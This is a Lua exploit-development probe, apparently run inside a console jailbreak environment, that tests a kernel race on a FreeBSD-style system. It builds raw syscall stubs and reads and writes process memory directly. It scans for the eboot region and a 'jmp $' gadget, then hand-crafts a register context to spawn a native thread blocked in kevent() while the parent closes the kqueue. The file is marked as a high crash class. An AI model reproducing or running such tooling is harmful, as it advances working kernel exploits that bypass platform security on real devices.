-- CRASH_CLASS: HIGH
-- PROBE 626a: a native child blocks in kevent() on a kqueue, the parent closes it.
print("=== PROBE 626a: KQUEUE CLOSE RACE ===")
local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=N(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rq(a) local o,v=pcall(function() return memory.read_qword(a) end) if o then return N(v) end return nil end
local function hi(a) return math.floor((a or 0)/4294967296) end
local function lo(a) return math.floor((a or 0)%4294967296) end

local stub=syscall.pipe.fn_addr
local sc_kqueue=mk(362) local sc_kevent=mk(363) local sc_close=mk(6)
local kq=N(sc_kqueue())
print(string.format("[A] kq=%d stub=%s",kq,tostring(stub)))
if kq<0 then print("[!] no kqueue"); return end

-- find eboot and a jmp $ spin
local sc674=mk(674)
local bufp=memory.alloc(0x20000)
local cnt=memory.alloc(4) wd(N(cnt),0)
pcall(function() sc674(U(N(bufp)),uint64(72),uint64(512),U(N(cnt)),uint64(0x40000000),uint64(0)) end)
local n=N((function() local o,v=pcall(function() return memory.read_dword(N(cnt)) end) return o and v or 0 end)())
local eb=nil
for i=0,n-1 do
    local b=N(bufp)+i*72
    local s=rq(b) local e=rq(b+8) local p=N((function() local o,v=pcall(function() return memory.read_dword(b+0x18) end) return o and v or 0 end)())
    if p==5 and e and s and (e-s)>0x92C6B then
        local o1,o2,o3,o4
        o1=pcall(function() return memory.read_byte(s+0x92C67) end)
        if o1 then eb=s end
    end
end
print(string.format("[B] eboot=%s regions=%d",eb and string.format("%08X",eb) or "none",n))
local spin=stub
repeat
    local v=pcall(function() return memory.read_byte(eb+0x42) end)
    break
until true
-- jmp $ = EB FE ; scan eboot head for it
local found=nil
local off=0
while off<0x20000 and not found do
    local o,v=pcall(function() return memory.read_byte(eb+off) end)
    if o and N(v)==0xEB then
        local o2,v2=pcall(function() return memory.read_byte(eb+off+1) end)
        if o2 and N(v2)==0xFE then found=eb+off end
    end
    off=off+1
end
if not found then print("[!] no jmp $"); return end
print(string.format("[C] spin=%08X",found))

local evlist=memory.alloc(0x200)
local block=memory.alloc(0x8000)
local store=memory.alloc(0x500)
local sa=N(store)
local ss=0x8000
local sb=N(block)
local rsp=sb+ss-8
wq(rsp,uint64(found))
for i=0,0x4F8,4 do wd(sa+i,0) end
wq(sa+0x048,uint64(kq))      -- rdi = kq
wq(sa+0x050,uint64(0))       -- rsi = changelist
wq(sa+0x058,uint64(0))       -- rdx = nchanges
wq(sa+0x060,uint64(N(evlist))); -- rcx -> r10 = eventlist
wq(sa+0x068,uint64(1))       -- r8 = nevents
wq(sa+0x070,uint64(0))       -- r9 = timeout NULL
wq(sa+0x078,uint64(363))     -- rax = kevent
wd(sa+0x0c0,0x43)
wd(sa+0x0d0,0)
wq(sa+0x0e0,stub)
wq(sa+0x0f8,uint64(rsp))
wd(sa+0x100,0x3B)
wd(sa+0x108,0x480)
wd(sa+0x110,0x10000)
local tid=memory.alloc(8)
wq(N(tid),uint64(0))
local sc430=mk(430)
local ok,rv=pcall(function() return sc430(uint64(sa),uint64(tid),uint64(0)) end)
print(string.format("[D] thr_create rv=%s tid=%s",tostring(ok and rv or "err"),tostring(rq(N(tid)))))
for i=1,300000 do local x=0 end
local ev0=rq(N(evlist))
print(string.format("[E] before close ev0=%s",tostring(ev0)))
local o1,rv1=pcall(function() return sc_close(U(kq),uint64(0),uint64(0),uint64(0),uint64(0),uint64(0)) end)
print(string.format("[F] close rv=%s ok=%s",tostring(o1 and rv1 or "err"),tostring(o1)))
for i=1,300000 do local x=0 end
print(string.format("[G] alive kq2=%d",N(sc_kqueue())))
print("[Z] alive")
